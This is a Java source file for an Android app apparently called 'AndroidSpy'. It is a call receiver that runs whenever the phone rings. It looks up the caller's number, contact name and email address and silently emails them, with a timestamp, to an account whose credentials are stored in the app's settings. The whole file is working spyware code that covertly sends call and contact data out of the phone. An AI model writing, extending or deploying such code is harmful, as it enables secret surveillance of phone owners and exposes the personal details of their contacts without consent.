package ru.itsolution.androidspy;

import java.text.SimpleDateFormat;
import java.util.Date;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.telephony.TelephonyManager;

@SuppressLint("SimpleDateFormat")
public class IncomingCallReciever extends BroadcastReceiver {

	private SimpleDateFormat s;
	private Cursor emailLookup;
	private SharedPreferences prefs;
	private String mEmail;
	private String mPass;

	public IncomingCallReciever() {
		s = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		Bundle bundle = intent.getExtras();
		prefs = context.getSharedPreferences("email", Activity.MODE_PRIVATE);
		
		mEmail = prefs.getString("email", "");
		mPass = prefs.getString("pass", "");
		
		if (mEmail.equalsIgnoreCase("")) return;

		if(null == bundle)
			return;

		String state = bundle.getString(TelephonyManager.EXTRA_STATE);

		if(state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING))
		{
			String contact_number = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
			Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(contact_number));
			String contact_name = "";
			String contact_mail = "";
			ContentResolver contentResolver = context.getContentResolver();
			Cursor contactLookup = contentResolver.query(uri, new String[] {BaseColumns._ID,
					ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);

			try {
				if (contactLookup != null && contactLookup.getCount() > 0) {
					contactLookup.moveToNext();
					String id = contactLookup.getString(contactLookup.getColumnIndex(BaseColumns._ID));
					contact_name = contactLookup.getString(contactLookup.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));

					emailLookup = contentResolver.query(Email.CONTENT_URI, null,
							Email.CONTACT_ID + " = " + id, null, null);

					if (emailLookup != null && emailLookup.getCount() > 0) {
						emailLookup.moveToNext();
						contact_mail = emailLookup.getString(emailLookup.getColumnIndex(Email.DATA));
					}
				}
				
			} finally {
				if (contactLookup != null) {
					contactLookup.close();
				}
				if (emailLookup != null) {
					emailLookup.close();
				}
			}

			String format = s.format(new Date());

			String info = "Входящий звонок\nДата: "+format+"\n";
			if (contact_name.equals("")) {
				info+="Номер телефона: "+contact_number;
			} else {
				info+="Контакт: "+contact_name+"\n";
				info+="Номер телефона: "+contact_number+"\n";
				if (!contact_mail.equals("")) {
					info+="Email: "+contact_mail;
				}
			}

			final Mail m = new Mail(mEmail, mPass); 
			String[] toArr = {mEmail}; 
			m.setTo(toArr); 
			m.setFrom("AndroidSpy"); 
			m.setSubject("AndroidSpy Log"); 
			m.setBody(info);
			new AsyncTask<Void, Void, Void>() {

				@Override
				protected Void doInBackground(Void... params) {
					try {
						m.send();
					} catch (Exception e) {
						e.printStackTrace();
					}
					return null;
				}

			}.execute();
		}
	}

}
